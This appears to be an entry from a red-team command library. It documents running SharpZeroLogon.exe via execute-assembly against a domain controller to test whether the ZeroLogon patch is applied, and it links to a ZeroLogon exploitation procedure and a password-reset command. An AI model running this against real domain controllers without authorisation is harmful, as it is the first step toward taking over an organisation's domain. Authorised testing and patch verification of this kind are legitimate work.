---
id: aee82aba-1c0a-4b2d-95ac-af719abd2e9f
name: execute-sharpzerologon-test-patch
type: command
executor: bash
data: execute-assembly SharpZeroLogon.exe $_DC_FQDN -patch
output: null
created_at: '2023-04-06T03:56:02.673468+00:00'
updated_at: '2023-04-10T20:36:01.289773+00:00'
platforms:
  - Windows
tags:
  - sharpzerologon
  - patch-test
verified: true
validated: true
---

# execute-sharpzerologon-test-patch

## Command

```bash
execute-assembly SharpZeroLogon.exe $_DC_FQDN -patch
```

## Description

Tests if the ZeroLogon patch is applied by attempting a post-reset authentication check.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DC_FQDN | DC FQDN | Yes |
| -patch | Patch test flag | Yes |

## Examples

### Basic Usage

```bash
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch
```

## Expected Output

```
[+] Patch status: Vulnerable/Patched.
```

## Related

- [[procedures/ZeroLogon-Exploitation-and-Post-Exploitation]]
- [[commands/execute-sharpzerologon-reset-password]]
